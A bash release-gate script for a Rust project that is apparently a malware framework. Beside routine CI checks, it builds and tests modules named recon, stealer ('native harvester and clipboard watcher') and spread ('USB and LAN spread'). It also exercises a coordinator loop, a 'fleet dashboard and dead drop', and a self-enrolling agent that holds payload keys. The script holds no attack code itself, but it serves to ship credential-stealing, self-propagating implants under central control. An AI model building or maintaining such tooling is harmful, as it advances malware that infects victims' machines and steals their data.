#!/usr/bin/env bash
# Reproduces the pre-plugin exit gate. Every step must pass before a module is
# authored against ABI 1. See docs/PLUGIN-READINESS.md for the evidence map.
set -euo pipefail

root=$(cd "$(dirname "$0")/.." && pwd)
cd "$root"

printf '== format ==\n'
cargo fmt --all -- --check

printf '== clippy (all targets, warnings denied) ==\n'
cargo clippy --workspace --all-targets -- -D warnings

printf '== dependency policy ==\n'
cargo deny check

printf '== workspace tests ==\n'
cargo test --workspace

printf '== frozen wire contract is pinned ==\n'
test -f FROZEN
cargo test -p msgfmt frozen_wire_format_matches_the_checked_in_contract

printf '== unsafe code policy is documented and narrow ==\n'
test -f docs/UNSAFE.md
grep -q '#!\[forbid(unsafe_code)\]' crates/msgfmt/src/lib.rs
grep -q '#!\[forbid(unsafe_code)\]' crates/transport/src/lib.rs
grep -q '#!\[deny(unsafe_code)\]' crates/agentd/src/lib.rs
grep -q 'allow(unsafe_code)' crates/agentd/src/limits.rs

printf '== acceptance suites are present ==\n'
test -f crates/agentd/tests/lifecycle.rs
test -f crates/agentd/tests/resilience.rs
test -f tests/integration/tests/findings.rs
for number in $(seq -w 1 13); do
    grep -q "fn d${number}_" tests/integration/tests/findings.rs
    grep -q "fn r${number}_" crates/agentd/tests/resilience.rs
done
printf 'd01-d13, r01-r13, and the lifecycle tests are committed\n'

printf '== dispatch is name-based, not body-matched ==\n'
grep -q 'fn handler_call(body: &TaskBody)' crates/agentd/src/main.rs
grep -q 'registry.handle(name, &args)' crates/agentd/src/main.rs
dispatch_body=$(sed -n '/async fn dispatch(/,/^    }$/p' crates/agentd/src/main.rs)
if printf '%s' "$dispatch_body" | grep -q 'match body'; then
    echo 'dispatch still matches TaskBody variants' >&2
    exit 1
fi
printf 'body mapping lives in handler_call; dispatch only forwards a name\n'

printf '== committed fixtures are present and bounded ==\n'
for fixture in hello bad_abi loop hog bomb traps no_alloc denied; do
    test -f "tests/fixtures/${fixture}.wasm"
done
hello_size=$(wc -c < tests/fixtures/hello.wasm)
test "$hello_size" -le 1024
printf 'hello.wasm %s bytes\n' "$hello_size"

printf '== examples, template, and recon mod build under 100 KiB ==\n'
cargo build --release --target wasm32-unknown-unknown \
    -p mod-proc-list -p mod-net-whoami -p mod-fs-tree
for wasm in target/wasm32-unknown-unknown/release/mod_*.wasm; do
    size=$(wc -c < "$wasm")
    test "$size" -le 102400
    printf '%s %s bytes\n' "$(basename "$wasm")" "$size"
done
# Build the template out-of-tree so the gate does not touch a checked-in target.
CARGO_TARGET_DIR="$root/target/template" \
    cargo build --manifest-path templates/mod/Cargo.toml \
    --release --target wasm32-unknown-unknown
template="$root/target/template/wasm32-unknown-unknown/release/mod_template.wasm"
test -f "$template"
printf 'mod_template.wasm %s bytes\n' "$(wc -c < "$template")"
CARGO_TARGET_DIR="$root/target/recon" \
    cargo build --manifest-path mods/recon/Cargo.toml \
    --release --target wasm32-unknown-unknown
recon="$root/target/recon/wasm32-unknown-unknown/release/mod_recon.wasm"
test -f "$recon"
recon_size=$(wc -c < "$recon")
test "$recon_size" -le 102400
printf 'mod_recon.wasm %s bytes\n' "$recon_size"
CARGO_TARGET_DIR="$root/target/stealer" \
    cargo build --manifest-path mods/stealer/Cargo.toml \
    --release --target wasm32-unknown-unknown
stealer="$root/target/stealer/wasm32-unknown-unknown/release/mod_stealer.wasm"
test -f "$stealer"
stealer_size=$(wc -c < "$stealer")
test "$stealer_size" -le 102400
printf 'mod_stealer.wasm %s bytes\n' "$stealer_size"
CARGO_TARGET_DIR="$root/target/spread" \
    cargo build --manifest-path mods/spread/Cargo.toml \
    --release --target wasm32-unknown-unknown
spread="$root/target/spread/wasm32-unknown-unknown/release/mod_spread.wasm"
test -f "$spread"
spread_size=$(wc -c < "$spread")
test "$spread_size" -le 102400
printf 'mod_spread.wasm %s bytes\n' "$spread_size"

printf '== ABI 2 acceptance ==\n'
cargo test -p integration-tests --test abi2

printf '== native harvester and clipboard watcher ==\n'
cargo test -p stealer
cargo test -p integration-tests --test stealer_mod

printf '== USB and LAN spread ==\n'
cargo test -p spread
cargo test -p integration-tests --test spread_mod

printf '== coordinator loop ==\n'
cargo test -p coordd

printf '== artifact pipeline ==\n'
cargo test -p agentd --test artifacts

printf '== fleet dashboard and dead drop ==\n'
cargo test -p fleetui

printf '== release binary starts unenrolled and exits cleanly ==\n'
cargo build --release -p agentd
state=$(mktemp -d)
trap 'rm -rf "$state"' EXIT
out=$(./target/release/agentd --worker --once --state "$state")
printf '%s\n' "$out"
case "$out" in
    "processed=0 skipped=0 cursor=0 dropped=0") ;;
    "processed=0 skipped=1 cursor=1 dropped=0") ;; # own heartbeat
    *) echo "unexpected output: $out" >&2; exit 1 ;;
esac
test -f "$state/alive"
test -f "$state/agent.key"
printf 'agentd --worker --once self-enrolled and exited 0 with no payload keys\n'

printf 'plugin gate passed\n'
